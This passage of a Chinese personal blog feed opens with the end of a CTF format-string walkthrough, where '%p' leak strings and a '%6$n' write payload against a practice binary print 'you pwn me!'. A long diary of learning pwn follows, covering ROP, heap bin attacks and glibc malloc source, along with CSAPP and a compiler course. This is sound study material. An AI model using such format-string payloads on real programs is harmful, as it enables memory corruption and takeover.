class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaa-%</span><span class="bash">p-%p-%p-%p-%p-%p-%p-%p-%p</span><br>aaaa-0x804a060-0xf75bca60-0x80485db-0x1-0x5-0xfff84494-0x4f3eea00-0xf77413dc-0xfff844c0<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>这个方法的重点在于：<strong>printf函数的参数是先被压入栈中后获取栈中的值或者地址作为参数的！</strong>当初没有想明白这个问题，困惑了好久。所以，我们发现，第5个参数的值是0x5，说明我们只要把第6个参数<code>（int* p）</code>改成0x10就可以了！</p><p>输入字符串：aaaaaaaaaaaaaaaa%6$n</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span><br><span class="hljs-meta">aaaaaaaaaaaaaaaa%</span><span class="bash">6<span class="hljs-variable">$n</span></span><br>aaaaaaaaaaaaaaaa<br>10<br>you pwn me!<br><span class="hljs-meta">$</span><br></code></pre></div></td></tr></table></figure><p>成功！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily</title>
    <link href="/2021-06/Now-Sky-Learning-Daily/"/>
    <url>/2021-06/Now-Sky-Learning-Daily/</url>
    
    <content type="html"><![CDATA[<h2 id="属于pwn的时间"><a href="#属于pwn的时间" class="headerlink" title="属于pwn的时间:"></a>属于pwn的时间:</h2><h3 id="第0周-6-7-6-13"><a href="#第0周-6-7-6-13" class="headerlink" title="第0周:6/7-6/13"></a>第0周:6/7-6/13</h3><ul><li>11: 为了ida成功把kali2020.3整莫得了, 不想去研究怎么复原了, 直接重装了个kali2021.2, 以后一定弄<strong>快照</strong>.</li><li>12: 弄明白了cachelab的食用方法, 直接ctrlcv代码理解了下, 但是看起来还是有很多可以改进的地方, 暂时看不进去了. <ul><li>typora装的时候apt-key出问题, 其实还能用几年, 更modern的解决办法<a href="https://suay.site/?p=526">在这</a>(还没看).</li><li>问题列表还是Markdown靠谱, 思维导图线太多了, 用不上结构的优势, 除了笔记还是用md吧.</li></ul></li><li>13: 今天计划看看那啥buuoj的题目: 没看懂从哪开始, 还在wiki中<ul><li>typora linux版命令行启动好像有点问题</li><li>啥玩意儿啊, 根本不知道怎么开始做ctf题目-&gt;搞懂了ssh连接到靶机, 结果做到第二题发现是web, 请求学不到家干脆放弃了.</li><li>看了点讲座的内网穿透, 有丶意思, 可惜我没有这种需求</li></ul></li></ul><h3 id="第一周-6-14-6-20"><a href="#第一周-6-14-6-20" class="headerlink" title="第一周:6/14-6/20"></a>第一周:6/14-6/20</h3><ul><li>啥也没干, 复习周</li></ul><h3 id="第二周-6-21-6-27"><a href="#第二周-6-21-6-27" class="headerlink" title="第二周:6/21-6/27"></a>第二周:6/21-6/27</h3><p>……………..</p><h3 id="第一周-7-10-7-11"><a href="#第一周-7-10-7-11" class="headerlink" title="第一周:7/10-7/11"></a>第一周:7/10-7/11</h3><ul><li><strong>10,11: 直接盲选了一手系统安全, 要开始学逆向之类的东西了.</strong> <ul><li>看了看洛神的攻防世界的题解, 看了第一道题我就下载了pwntools ida peda这三个工具, 用了下checksec看看文件的类型, 再试了试nc命令连接到服务器, 运行一下就得到了flag</li><li>第二题是关于格式化字符串漏洞的, 看了老半天, 洛神直接写个很明显, 真不知道他写这个的时候是什么水平, 我还啥都不会呢. 哦对, 我看到一半他居然写了个python, 还是用的pwntools的接口, 人傻了, 明天入门python去, 然后再看看pwntools的python写法</li></ul></li></ul><h3 id="第二周-7-12-7-18"><a href="#第二周-7-12-7-18" class="headerlink" title="第二周:7/12-7/18"></a>第二周:7/12-7/18</h3><ul><li><p><strong>12:这周不做CG了, 开始研究CTF</strong>.</p><ul><li>今天先入门个python先.</li></ul></li><li><p><strong>13: 今天打算学习pwntools的用法</strong>.</p><ul><li>python看到了package,  看过了import, 各种基本类型的用法, 类还没看.</li><li><a href="https://pwntools.readthedocs.io/en/latest/tubes/sockets.html#module-pwnlib.tubes.remote">pwnlib.tubes</a>, 这里有很多东西, 可以直接网页打开然后去搜函数, unpack()和pack()的作用是将数字打包成可输入的字符串</li><li>vscode装python还是挺简单的</li><li><code>%&lt; number&gt;$x</code> 是直接存放到第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.<ul><li>在%10n是啥以及为啥要加‘AAAA’这些问题上卡了半天. <a href="https://bbs.pediy.com/thread-253638.htm">[0]</a>.</li><li><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是<strong>对应参数（这个参数是指针）</strong>的对应的地址开始起几个字节。<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">[0]</a>.</li></ul></li></ul></li><li><p><strong>14: IDA东西好多, 也看了看pwntools的文档, 特么也太多了</strong>.(level2整完了, 明天看看文档告别硬编码!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!(先会看再说))</p><ul><li><code>var_4 = dword ptr -4；</code>  这是解释代码，可解释成var_4 是 esp - 4处的空间;<br><code>var_0 = dword ptr 8;</code>      var_0 是 esp +8处的空间；<img src="https://i.loli.net/2021/07/19/LtySjIVDrhfwlk7.png"></li></ul></li><li><p><code>/bin/bash</code>是个好东西, 如果能调用这个可以直接跳转到命令行模式, <code>interactive()</code>打开后就能发命令了</p><p><img src="https://i.loli.net/2021/07/19/TrCMBZjQpANFYhK.png"></p></li><li><p>将悬浮窗口复位: reset the desktop (md变成悬浮窗口就变不回去了??????????)</p><ul><li>芜湖, <strong>savedesktop</strong>还挺好用, 设置了一个我现在水平够用的default</li></ul></li><li><p>shift+F12: <u>strings window</u>.(还有f6,shift+f6,alt+f3)</p></li><li><p>汇编语言<a href="https://blog.csdn.net/weixin_43229030/article/details/106799580#15_comment_field_166">伪指令</a>.   a db 17 dup(?)的<a href="https://zhidao.baidu.com/question/2198876873686806628.html">含义</a>.</p></li><li><p>奇怪的信息: </p><img src="https://i.loli.net/2021/07/19/pYrMl7BxPmhfzUs.png" style="zoom: 50%;" /></li><li><p>python: next()函数和search()的返回是一个可迭代的类型</p></li><li><p><em><strong><u>在32位程序运行中，函数参数直接压入栈中</u></strong></em>,(还能这样???????????????????????????????????)</p><p>(64位汇编传参，当参数少于7个时， 参数<strong>从左到右</strong>放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时，<br>前 6 个与前面一样， 但后面的依次**”从右向左”**放入栈中，即和32位汇编一样。)</p><p>调用函数时栈的结构为:调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;…-&gt;参数1</p></li><li><p><strong>15: 上午还是IDA的使用, 下午再看文档. 下午也没看,</strong> .</p><ul><li>return __readfsqword(0x28u) ^ v4; 这个是金丝雀值canary的检测</li><li><u><em>重启大法好</em></u>.(好个屁, 还是没解决)</li><li>千万别把文件名称命名为模块名称, 不然会出错.</li><li>sendlineafter的 <strong>“\n”</strong>一定要看清楚了再加</li><li>函数栈帧的构建过程, <strong>会把ebp推到栈上</strong>.</li><li>看看Jump菜单里的快捷键!</li><li>刚进入函数时, 栈顶是返回地址!</li></ul></li><li><p><strong>16: 今天不知道能做多少, 早上姑且整完了adworld的writeup, 下午晚上看情况, 开始buuoj</strong>, </p><ul><li><p>看了剩下的tutorial, 一些看不懂, 有用到再说吧</p></li><li><p>RWX权限: r代表读权限，w代表写权限，x代表执行权限</p><p>相关的<a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令</a> </p></li><li><p><a href="https://blog.csdn.net/weixin_43655282/article/details/105334313">retn</a>与<em>堆栈平衡或内存对齐</em>   (适用于<strong>Ubuntu18</strong>及以上的版本).</p></li></ul></li><li><p><strong>17: 今天在动车上姑且做到了第七题, 并且下载好了LibcSearcher库, 明天开始拿下第七题</strong> </p><ul><li>看懂了python2和python3中的字符串的<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">区别</a>(复习了<a href="https://www.zhihu.com/question/23374078">Unicode和UTF-8</a>), python3 加上的就是这两种类型<strong>不能混用</strong> </li><li>整明白了eip寄存器(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)和堆栈平衡的东西, 明天再写篇文档顺便整理整理越来越多的md文件.</li></ul></li><li><p><strong>18:整了个blog, hexo+Github</strong>.</p></li></ul><h3 id="第三周-7-19-7-25"><a href="#第三周-7-19-7-25" class="headerlink" title="第三周: 7/19-7/25"></a>第三周: 7/19-7/25</h3><ul><li><p><strong>19: 终于弄完了github上的blog, 以后就这样发东西了</strong> </p><ul><li>python3 -m pydoc -p 0 : 可以查看本地文档</li></ul></li><li><p><strong>20: 白天看python的语法, 看到了formatted_string, 晚上继续做题BUUOJ看LibcSearcher</strong> </p><ul><li><strong><a href="https://yogdzewa.github.io/2021-07/pwn-ROPgadgetDoc/">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">anotherIntroduce</a></strong> </li><li>hide的文章可以通过网址访问</li><li>pwn查找字符串的<a href="https://blog.csdn.net/weixin_43921239/article/details/105318835">方法</a>.(指查找程序中的字符串|查找 libc 中的字符串之类的)</li></ul></li><li><p><strong>21: 继续OJ</strong> </p><ul><li>虚拟机里vim的复制粘贴好像有点特别</li><li>今天才做了两道题pwn+babyrop, 我觉得需要反思下到底哪里慢了<ul><li>主要还是想自己摸索, 结果好多东西看别人的学得更快, <strong>又叒叕</strong>复习了一遍%n是修改<strong>指针</strong>指向的值(源自CGfsb), c语言函数有点不太熟悉(strlen就是, 没反应过来是以’\0’为止的, 以及strncmp返回值和第三个参数即长度为0时两个字符串相等), 今天看文档也用了不少时间(fmtstr_payload, flat, pack等), 总的说来学得还算不少, 不过感觉还是有点慢(｀⌒´メ)</li></ul></li></ul></li><li><p><strong>22: 继续</strong> </p><ul><li><p>linux <u>终端suspend问题</u>: pressing the ctrl+z is to suspended current process <a href="https://www.cnblogs.com/jiangzhaowei/p/8971265.html"><strong>[0]</strong></a>.</p></li><li><p>python3 用pwntools什么东西都得加一个b, 绝了.<br>“/bin/sh”没加也报错, 还有ELF.search返回的是一个可迭代的对象<br>sendlineafter没加b也在那里给警告<br>简单题多做几遍还能多几次收获, 哇, 哇</p></li><li><p>IDA 逆向<a href="https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h">常用宏定义</a> </p></li><li><p>pwntools的context默认32位, 还是每次手动设定的好,  推荐使用:<code>context.binary = &#39;./challenge-binary&#39;</code>.</p><img src="https://i.loli.net/2021/07/22/ueHT3S7ComhkflA.png" alt="image-20210722202114278" style="zoom: 67%;" /> </li><li><p>查找字符串-&gt;flag.txt-&gt;Ctrl+X, Jumptothereference-&gt;继续</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//常见函数:</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getc</span><span class="hljs-params">(FILE *stream)</span>                                   <span class="hljs-comment">//返回字符的int类型值</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n, FILE *stream)</span></span>;              <span class="hljs-comment">//从文件流中读取字符到str中</span><br><span class="hljs-function">FILE *<span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;    <span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;    <span class="hljs-comment">//一般是write(1,buf,nbyte),stdout = 1</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sys_read</span><span class="hljs-params">(stdinput:<span class="hljs-number">0</span>, buf, size)</span></span><br><span class="hljs-function"><span class="hljs-comment">//习惯上，标准输入的文件描述符是 0，标准输出是 1，标准错误（standard error）是 2。</span></span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>bss段原理: executable文件中只记录未初始化变量的起始和终止地址, 在运行时操作系统将这部分内存清零(通过匿名mmap映射.)</p></li><li><p>可以直接sendline, 不一定要一直用sendlineafter.</p></li><li><p><strong>23: 还是继续</strong> </p><ul><li>复习了一下<a href="https://www.cnblogs.com/tcctw/p/11333743.html">栈帧对齐</a> </li><li>发现自己对linux的系统函数不熟导致做题不清楚(包括/bin/sh和sh是一样的, 都在系统路径里), 准备重补CSAPP里的Linux函数</li><li><a href="https://blog.csdn.net/zhizhengguan/article/details/112338314">getegid等等</a> </li><li>明天补补CTF-WiKi上的东西, 感觉还挺有用的(因为最新一题要用到fastbin attack……….)</li></ul></li><li><p><strong>24-25: 补补知识</strong> </p><ul><li>复习了下<a href="https://www.cnblogs.com/killerlegend/p/3906502.html">AT&amp;T和Interl语法</a> </li><li>LONG_MAX = INT_MAX</li><li><h3 id="第四周-7-26-8-1"><a href="#第四周-7-26-8-1" class="headerlink" title="第四周: 7/26-8/1"></a>第四周: 7/26-8/1</h3></li></ul></li><li><p><strong>26-28: 划水+看CTF-WiKi上的heap内容</strong> </p></li><li><p><strong>29: 继续WiKi</strong> </p><ul><li><code>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</code> </li><li>我居然还在看WiKi, 关键是他的东西也太多了吧, 之前还以为可以跳过的, 结果全都得倒回去看原理和代码, 这波真的是大意了. 堆的相关内容真的好长</li><li>fastbin是单链表, 所以元素的用户数据段前八字节有数据, 且是fd</li><li><strong>fd_nextsize， bk_nextsize</strong>是largebins的指针<code>#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</code></li><li>至少包含bk指针, largebins的特有指针可以不要</li><li>奇了怪了, 看了半天才看出来fastbins里的链表头指针数组的数量是<code>maxsize</code>的字节数, 所以才有<code>fastbin_index(chunksize(victim))</code>这种用字节数定位下标的算法, 好像真的没有一句明白的话说明这玩意儿, 绝了, 看了半天源码才看出来……..<br>还是乖乖看源码吧……..</li></ul></li><li><p><strong>30:看懂了fastbinattack</strong></p><ul><li>nextchunck是指高地址的那一个</li><li><strong>malloc_consolidate</strong> 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</li></ul></li><li><p>31: </p><ul><li><a href="https://github.com/longld/peda">gdb-peda</a> <h3 id="第五周-8-2-8-8"><a href="#第五周-8-2-8-8" class="headerlink" title="第五周: 8/2-8/8"></a>第五周: 8/2-8/8</h3></li></ul></li><li><p><strong>8/2 3: 做题</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">pwndbg和Pwngdb</a> </li><li>关于gdb.attach(p)的<a href="https://www.jianshu.com/p/fc91ff8319e6">几句话</a> </li><li>查询各版本libc.so文件的main_arena_offset的<a href="https://github.com/coldwave96/libcoffset">小工具</a> </li><li><strong>而且recv是从缓冲区获取数据, 必须把前面的都取出来才能够recv(4)</strong> </li></ul></li><li><p><strong>8/4,5: 做题</strong> </p><ul><li>系统调用号在32位和64位系统是不一样的. <a href="https://giantbranch.blog.csdn.net/article/details/78777938">查询表</a> </li><li>关于libc_csu的内容在<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1">CTF_WiKi</a>中</li><li>additionally <strong>recursively dereferencing</strong> all pointers.<img src="https://i.loli.net/2021/08/04/GAxeO2D67LfbKPw.png" alt="image-20210804234240069" style="zoom:80%;" /></li><li>flat和pack只对数字生效, 对不足四字节或八字节的数据请自行填充完整</li><li>gdb.attach用法 <code>io = gdb.debug(&#39;./hello&#39;, [gdb_scrip])</code> 注意要写路径</li><li>已放弃gdb.attach(), 实在搞不明白怎么用</li></ul></li><li><p><strong>8/6: 学习</strong> </p><ul><li><p>gdb中<strong>默认关闭随机化</strong>, 使用show disable-randomization或set disable-randomization off关闭“<strong>禁止随机化</strong>”</p><p><a href="https://www.dazhuanlan.com/ourlaputa/topics/975254">关于ASLR和PIE详细内容</a>, 前者是Linux系统特有打乱所有的东西, 后者是编译器加上的保护措施, PIE会打乱bss text data加载基址, 不过这是一个固定值, 当我们打开了Linux的ASLR 2才能够真正的<strong>随机</strong>.</p></li><li><p>整理writeup</p></li></ul></li><li><p><strong>8/7:继续</strong> </p><ul><li>看完了堆的全部基础内容, 还剩下各种利用方法没看</li><li>了解了一波<strong>SROP</strong>, 尝试写了一题(其实是某题的第二种方法)</li><li>BUUOJ好几道都是做过的或者很相似的题目, 相当于复习了也比较基础</li></ul></li><li><p><strong>8/8:继续</strong> </p><ul><li>看了看栈转移和asm(shellcraft), 以及<a href="https://support.typora.io/Draw-Diagrams-With-Markdown/">Typora的图表文档</a> <a href="https://github.com/adrai/flowchart.js">[flowchart github]</a> <a href="https://mermaid-js.github.io/mermaid/#/flowchart">[mermaid]</a> </li><li>学习unsorted bin attack, <code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量</li><li><a href="https://github.com/shellphish/how2heap">heap exploitation: how2heap</a> </li></ul></li></ul><h3 id="第六周-8-9-8-15"><a href="#第六周-8-9-8-15" class="headerlink" title="第六周: 8/9 - 8/15"></a>第六周: 8/9 - 8/15</h3><ul><li><p><strong>8/9:今天看GNU C Library源码(关于heap)</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43833642/article/details/104681190">glibc源码下载&amp;在线阅读地址合集</a> </li><li>写点heap源码的笔记</li></ul></li><li><p><strong>8/10,11,12:继续源码</strong></p><ul><li><a href="https://qzy.im/blog/2020/05/typora-integrate-the-latest-version-of-mermaid/">Typora不支持最新Mermaid语法的解决办法</a> </li><li>学了下mermaid的用法(或许将来能用到), 还有app.diagram.net的画图</li><li>按住ctrl用鼠标点击多个地方可以同时编辑</li><li>华庭的glibc解析中chunk size链表即为largebin的fd_nextsize和bk_nextsize</li><li>&lt;span id=”jump”&gt;跳转到的地方&lt;/span&gt;    跳转本页锚点的方法</li></ul></li><li><p><strong>8/13:搞定malloc.c中除了多线程的所有源码</strong> </p><ul><li>emmmmm我是不是要补补多线程的东西, 总不能一直都不知道吧, 明天我去问问还能拖到什么时候学(bushi)</li></ul></li><li><p><strong>8/14-15:写各种bin attack的分析文, 写完打算入坑ucore Lab1</strong> </p><ul><li><a href="https://blog.csdn.net/Katherine_hsr/article/details/79179622">makdown数学公式</a> </li><li><a href="https://blog.csdn.net/xiaojin21cen/article/details/90292315">修改theme</a> </li></ul></li></ul><h3 id="第七-八周-8-16-8-29"><a href="#第七-八周-8-16-8-29" class="headerlink" title="第七,八周: 8/16-8/29"></a>第七,八周: 8/16-8/29</h3><ul><li><strong>bin attack &amp; easyheap</strong> <ul><li>出现了glibc版本问题, 需要再将源码分析和最新版本<code>2.34</code>比对一下 </li><li>直接执行.so文件来查看glibc版本</li><li><a href="https://www.cnblogs.com/qisi007/p/13731562.html">Gittalk插件</a> </li></ul></li><li><strong>补完了CSAPP上signal的部分, 不得不说内容真的是太多了</strong> </li></ul><h3 id="第九周-8-30-9-5"><a href="#第九周-8-30-9-5" class="headerlink" title="第九周: 8/30-9/5"></a>第九周: 8/30-9/5</h3><ul><li><strong>志愿者+shellab</strong> <ul><li>getopt()    strchr()</li><li><strong>Ctrl+z</strong> 发送的是 <strong>SIGTSTP</strong> </li><li>Kali 上unsigned long int长8字节, 我在windows上用g++是4字节和int一样长</li><li>architecturelab还没做, 都不知道要不要弄了, 书上好多还没看又得要几天</li><li>继续CSAPP, 怎么还没看完啊…….</li><li><em><strong>重大教训</strong></em>, 在Z-Library上找到了csapp的英文非扫描版, 终于不用在笔记排版上浪费那么多的时间了</li><li>8/5 看到了处理器体系结构第三节</li></ul></li></ul><h3 id="第十周-9-6-9-12"><a href="#第十周-9-6-9-12" class="headerlink" title="第十周: 9/6-9/12"></a>第十周: 9/6-9/12</h3><ul><li><strong>CSAPP</strong> <ul><li>process architecture看了一天半看不下去了, 还有剩下的Network &amp; Concurrent Programming以后再找机会看吧</li></ul></li><li><strong>Rust</strong> <ul><li><u>看了五天的Rust Official Document</u>, 相当于是应了肖老师的建议, 不过看了一大半之后还能继续做什么还没有思考, 不过大概率不去做网页组的事情了</li><li>妄图和肖哥比确实是一种自不量力的行为, 我要好好反思一下自己要走的路</li></ul></li><li><strong>BUUOJ</strong> <ul><li>做个几题意思一下</li></ul></li></ul><h3 id="第十一周-9-13-9-19"><a href="#第十一周-9-13-9-19" class="headerlink" title="第十一周: 9/13-9/19"></a>第十一周: 9/13-9/19</h3><ul><li><strong>又看了一下<a href="http://www.voidcn.com/article/p-yxixqubd-bmr.html">checksec</a>的保护机制</strong> </li><li>准备了一手CCF CSP, 虽然没学算法的大家都是一个水平</li><li>做个两题</li></ul><h3 id="第十二周-9-20-9-26"><a href="#第十二周-9-20-9-26" class="headerlink" title="第十二周: 9/20-9/26"></a>第十二周: 9/20-9/26</h3><ul><li>IDA pro book感觉挺有用的, 抽个时间看看</li><li>上面这本书中的一部分的博客: <a href="https://blog.csdn.net/andiao1218/article/details/101192650">名称与命名</a>, 讲如何更改函数或变量名称</li><li>vim<a href="https://blog.csdn.net/cbaln0/article/details/87979056">查找与替换</a> </li><li>面试V&amp;N的pwn方向, 和当时的肖学长差不多水平, 但是现在的面试比较严格, 叫我再学两个月, 我现在退坑pwn去走一遍肖学长的learn list补补基础(编译原理和操作系统)</li><li>太忙了, 搞综测, 又没周末, 实验又多, 下周再学吧</li></ul><h2 id="操作系统-编译原理"><a href="#操作系统-编译原理" class="headerlink" title="操作系统+编译原理"></a>操作系统+编译原理</h2><h3 id="第十三周-9-27-10-7-8-9-10-国庆全算进去吧"><a href="#第十三周-9-27-10-7-8-9-10-国庆全算进去吧" class="headerlink" title="第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)"></a>第十三周: 9/27-10/7+8+9+10(国庆全算进去吧)</h3><ul><li><p><strong>10/1-2 : 编译原理</strong></p><ul><li>刚开始编译原理，操作系统的话看看有无必要同时进行</li><li>编译原理概念过多, 暂缓几天, 现在先看操作系统</li><li>这几天打算看看CSAPP的并行部分(tmd怎么还没看完, 笔记不做了就画个线好了)</li></ul></li><li><p><strong>10/3 : 操作系统</strong> </p><ul><li><p>在弄ucore环境, 加入了新的vim<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_2_3_1_softwares.html">命令</a>, 包括<a href="https://www.cnblogs.com/marsggbo/p/12152374.html">这个</a>.</p></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/">ucore实验参考书</a> </p></li><li><p>GCC内联汇编</p><ul><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_3_gcc_inline_asm.html">基本内联汇编</a><br><code>&quot;asm&quot; 和 &quot;__asm__&quot;</code>, 如有多行每一行都要加上 <code>&quot;\n\t&quot;</code>,<br>实际上gcc在处理汇编时，是要把asm(…)的内容”打印”到汇编文件中，所以<strong>格式控制字符</strong>是必要的。</p></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_4_extend_gcc_asm.html">扩展内联汇编</a> 详见网站 好复杂, 用时再看</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> [<span class="hljs-keyword">volatile</span>] ( Assembler Template<br>   : Output Operands<br>   [ : Input Operands<br>   [ : Clobbers ] ] )<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_3_gdb.html">gdb基本命令以及窗口命令</a> </p></li><li><p>下午改学编译原理</p></li></ul></li><li><p><strong>10/4 : 编译原理</strong> </p><ul><li><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </li><li>安装好PA环境, 开始cs143第一个实验</li><li>(看了学校的课程:数据库系统)</li><li>软件安装问题<ul><li>芔, 根本没装好, 为了在kali上做实验整了半天flex安装, 一直给我提示缺少GNU m4, 我寻思哪里都没见过这东西啊, 找了半天m4也装了半天, 结果发现直接apt install就行了, m4的版本不重要, 重要的是flex低版本的源码级安装(也不知道有没用, 先装了再说)(<strong>后来还是用了apt install flex</strong>)</li><li>文章里说的<code>./configure &amp;&amp; make &amp;&amp; sudo make install</code>就是在相应文件夹下执行就可以了</li><li>apt自动管理软件的依赖问题, 各种命令直接搜索即可</li><li><a href="https://www.cnblogs.com/EasonJim/p/7144017.html">Ubuntu通过apt-get安装指定版本和查询指定软件有多少个版本</a> </li></ul></li></ul></li><li><p><strong>10/5 : 编译原理</strong> </p><ul><li>Ibus打出<code>&quot;安&quot;</code>需要按下A+J(an) , 真特么奇怪</li><li>Linux下<code>!</code>的<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</li><li>COOL文档看了一半, tour文档刚开头, 这种长文章确实<strong>耗时间</strong>, 晚上看完PA1吧, 就不自己写了</li><li>xodo不要拖动pdf文件查看, 会出现无法保存的情况</li><li>看了一天的英文文档, 属实快累死了, 终于到了PA2</li></ul></li><li><p><strong>10/6 : 继续苦逼编译原理</strong> </p><ul><li>有点其他事, 继续看了文档</li></ul></li><li><p><strong>10/7-10 : 还是看文档</strong> </p><ul><li>课程看了两天, 实验相关只花了一下午看</li><li><strong>#line 命令(还是没懂)</strong> <ol><li>#line 行号<br>其中行号必须是1~32 767之间的整数，此指示导致程序后面的行被编号为n,n+1,n+2,…</li><li>#line 行号 “文件名”<br>其中行号和文件名说明来源的行号和文件名，指示后面的行会被认为是来自文件，行号由n开始。<br>​    #line指示一种作用是改变__LINE__,__FILE__宏的值。但是大多数编译器不支持#line。#line 主要用于那些产生C代码作为输出的程序，程序员并不常用#line。</li></ol></li><li><strong>看了这么多天文档终于会写代码了, 好感动(╥╯^╰╥)</strong> </li></ul></li></ul><h3 id="第十四周-10-11-10-17"><a href="#第十四周-10-11-10-17" class="headerlink" title="第十四周: 10/11-10/17"></a>第十四周: 10/11-10/17</h3><ul><li>终于整完了cool.flex, 开始看parse部分</li><li>flex的源码分析抽空看一看, 只写cool.flex还是忽略了一些细节</li><li>救命啊, 这编译原理也太猛了, 概念多得离谱, 词法+语法分析是能够一周完成的任务吗???<br><del>不过还能学下去就是了, 如果是实验的话应该会省略掉一些细节, 毕竟课程还是啥都讲, 从劣到优全都介绍一遍</del><br>已经学不下去了</li><li>学傻了, cool文档哪里看的过来啊</li></ul><h3 id="第十五周-10-18-10-24"><a href="#第十五周-10-18-10-24" class="headerlink" title="第十五周: 10/18-10/24"></a>第十五周: 10/18-10/24</h3><ul><li>我以为我看完文档了, 结果又看到产生式里面给我来一个<code>error &#39;;&#39;</code>人又蒙了, 一看Bison文档在第六章, 我就差这个没看呢, 不过后面的章节应该不是很重要了, 就算做我看完了吧:cry: </li><li>21号, 手写数据库命令行, 练习一下纯命令形式的数据库管理, 以及查看文档的水平, 但没想到的是会错在书上的错误示例中:cold_sweat: </li><li>周末用了一天时间写数据库, 比较忙</li><li>?</li></ul><h3 id="第十六周-10-25-10-31"><a href="#第十六周-10-25-10-31" class="headerlink" title="第十六周: 10/25-10/31"></a>第十六周: 10/25-10/31</h3><ul><li>服啦, 还是不要想着三个星期整完编译原理了, 毕竟至少一个月打底了</li><li>这几天还是在看视频. 就这视频是能几个星期看完的???还剩下PA45没做</li><li>感天动地, PA4终于能看懂了, 周末尽量争取PA5开个头:ghost: </li><li>把所有文件的关系理一遍终于看懂了PA4, 也对PA3和PA2有了更清楚的理解, 果然还是要把源码看一遍才懂写下去的都是些什么类型什么变量. PA5我还是先看看视频吧, 勉强算作一个开头</li><li>一个小问题是kali中<strong>使用中文输入法的时候无法在vscode中用光标选中文本</strong> </li></ul><h3 id="第十七周-11-01-11-07"><a href="#第十七周-11-01-11-07" class="headerlink" title="第十七周: 11/01-11/07"></a>第十七周: 11/01-11/07</h3><ul><li>10/01-02: 听了两天的Stanford的课程感觉针不戳, 除了听力没有好到不用看字幕之外看的非常舒服, 不过全看一遍要花非常多的时间, 所以现在改为看PDF, 而PA5会尽快提上日程</li><li>vscode的快捷键真的是超乎想象, 有机会就去看一点</li><li>CSAPP没读完真是硬伤, 关键是哪有看那么快的啊.. 周六开始看网络编程部分, 后续可能补完处理器体系结构(没有然后了)</li><li>看了一点汇编代码MIPS的manuals, 